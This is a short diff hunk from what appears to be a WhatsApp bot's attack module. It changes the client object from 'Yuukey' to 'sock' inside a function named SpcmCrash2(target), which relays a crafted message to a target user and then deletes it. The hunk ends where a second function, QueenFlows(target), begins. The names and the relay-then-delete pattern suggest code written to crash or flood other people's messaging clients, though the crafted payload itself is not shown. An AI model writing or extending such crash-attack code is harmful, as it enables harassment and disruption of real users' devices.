@@ -2028,13 +2028,13 @@ async function SpcmCrash2(target) {
         { userJid: target }
       );
 
-      await Yuukey.relayMessage(target, msg.message, {
+      await sock.relayMessage(target, msg.message, {
         participant: { jid: target },
         messageId: msg.key.id,
         addtionalNodes: Node
       });
       await sleep(1);
-      await Yuukey.sendMessage(target, { delete:msg.key });
+      await sock.sendMessage(target, { delete:msg.key });
     }
     
 async function QueenFlows(target) {
